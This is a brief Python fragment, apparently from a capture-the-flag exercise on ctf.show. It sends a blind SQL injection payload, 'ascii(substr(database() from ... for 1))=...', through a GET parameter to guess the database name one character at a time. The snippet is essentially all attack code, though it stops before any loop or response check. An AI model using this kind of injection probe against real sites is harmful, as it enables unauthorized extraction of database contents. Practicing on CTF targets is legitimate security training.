import requests
url = "https://b14e78f6-4073-4fa1-ad67-8d5d1ed1deab.challenge.ctf.show/index.php?id="
num1 = 1
num2 = 97
data = "ascii(substr(database() from %d for 1))=%d" % (num1, num2)
result = requests.get(url + data)
